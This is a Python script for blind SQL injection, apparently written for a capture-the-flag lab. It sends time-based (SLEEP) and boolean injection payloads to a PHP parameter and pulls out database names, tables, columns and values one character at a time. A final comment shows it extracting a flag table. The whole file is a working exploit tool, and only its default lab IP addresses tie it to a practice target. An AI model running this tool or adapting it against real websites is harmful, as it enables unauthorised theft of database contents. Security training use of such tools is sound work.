#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus
from time import time
from itertools import chain
from argparse import ArgumentParser
import sys


class Blind():
	def __init__(self, url='http://10.102.10.42/regards.php?email=',
				 delay=0.1, boolean=False, indicator=None, verbosity=0):
		self.url = url
		self.delay = delay
		self.boolean = boolean
		self.debug = verbosity
		self.db = None
		self.table = None
		self.expression = None

		if self.boolean:
			self.make_payload = self.make_bool_payload
		else:
			self.make_payload = self.make_time_payload
		self.indicator = indicator

	def send(self, payload, method='GET'):
		payload = quote_plus(payload)
		start = time()
		if method == 'GET':
			r = requests.get(self.url + payload)
		elif method == 'POST':
			r = requests.post(self.url, data=payload)

		end = time()

		return self.validate(start, end, r)

	def make_time_payload(self, cond):
		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
				"),0) AND 'a'='a"
		return query

	def make_bool_payload(self, cond):
		query = "' OR " + cond + " AND 'a'='a"
		return query

	def validate(self, start=None, end=None, response=None):
		if self.boolean:
			if self.indicator in response.text:
				return True
			else:
				return False
		else:
			if end - start >= self.delay:
				return True
			else:
				return False

	def get_length(self, item):
		self.expression = item
		condition = 'LENGTH(' + item + ')={}'
		r = False
		i = 0

		while not r:
			i += 1
			payload = self.make_payload(condition.format(i))
			r = self.send(payload)

		return i

	def get_string(self, item, length=None):
		if not length:
			length = self.get_length(item)

		condition = "SUBSTRING(" + item + ",{},1)='{}'"
		string = ''

		for i in range(1, length + 1):
			r = False
			for j in chain(range(95, 127), range(65, 91), range(48, 58),
						   range(32, 48), range(58, 65), range(91, 95)):
				payload = self.make_payload(condition.format(i, chr(j)))
				r = self.send(payload)
				if r:
					break

			string += chr(j)
			if self.debug:
				print(chr(j), end='')
				sys.stdout.flush()

		if self.debug:
			print()

		return string

	def test(self, cond):
		if cond:
			return self.send(self.make_payload(cond))

	def get_db(self, force=False):
		if self.db:
			return self.db
		if force:
			return self.get_string('DATABASE()')
		else:
			return None

	def get_schemas(self):
		cond = '(SELECT GROUP_CONCAT(DISTINCT table_schema) FROM '
		cond += 'information_schema.tables)'
		return self.get_string(cond)

	def get_tables(self, db=None):
		if not db:
			db = self.get_db(force=True)

		cond = "(SELECT GROUP_CONCAT(DISTINCT table_name) FROM "
		cond += "information_schema.tables"
		cond += " WHERE table_schema='{}'".format(db)
		cond += " LIMIT 1)"
		return self.get_string(cond)

	def get_columns(self, table=None, db=None):
		if not db:
			db = self.get_db()
		if not table:
			table = self.table
		if not table:
			error = 'No table specified, using first table found: {}'
			table = self.get_tables(db).split(',')[0]
			print(error.format(table))

		cond = "(SELECT GROUP_CONCAT(column_name) FROM information_"
		cond += "schema.columns WHERE table_schema='{}' AND "
		cond += "table_name='{}' LIMIT 1)"
		cond = cond.format(db, table)

		return self.get_string(cond)


def get_args():
	parser = ArgumentParser()
	parser.add_argument('-t', '--test', action='store_true',
						help='Test expression')
	parser.add_argument('-l', '--length', action='store_true',
						help="Get length of expressions's result")
	parser.add_argument('-s', '--string', action='store_true',
						help='Get the string resulting from expression')
	parser.add_argument('-d', '--delay', default=0.1, type=float,
						help='Delay for time-based blind')
	parser.add_argument('-b', '--bool', action='store_true',
						help='Use bool-based blind instead of time-based')
	parser.add_argument('-i', '--indicator', default='correctly set',
						help='Indicator for bool-based blind')
	parser.add_argument('-u', '--url',  help='Target URL',
						default='http://10.102.8.197/regards.php?email=')
	parser.add_argument('--get-schemas', action='store_true',
						help='Get table schemas')
	parser.add_argument('--get-tables', action='store_true',
						help='Get tables from database')
	parser.add_argument('--get-columns', action='store_true',
						help='Get columns from database')
	parser.add_argument('--table', help='Act on specified table')
	parser.add_argument('--db', help='Act on specified DB')
	parser.add_argument('-v', default=0, action='count', dest='verbosity',
						help='Verbosity')
	parser.add_argument('-e', '--expression', default='DATABASE()',
						help='Expression to check')

	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	b = Blind(url=args.url, delay=args.delay, boolean=args.bool,
			  verbosity=args.verbosity)
	results = {}

	if args.indicator:
		b.indicator = args.indicator

	if args.db:
		b.db = args.db
	if args.table:
		b.table = args.table
	if args.get_schemas:
		results['schemas'] = b.get_schemas()
	if args.get_tables:
		results['tables'] = b.get_tables()
	if args.get_columns:
		results['columns'] = b.get_columns()
	if args.test:
		results['test'] = b.test(args.expression)
	if args.length:
		results['length'] = b.get_length(args.expression)
	if args.string:
		results['string'] = b.get_string(args.expression)

	results['expression'] = b.expression
	print('\n{}'.format(results))

# /ex.py -u http://10.102.8.197/s3cret_manag3r_pag3.php?name= -b -v -s -e "(SELECT GROUP_CONCAT(flag) FROM secret_db.flag_table)"
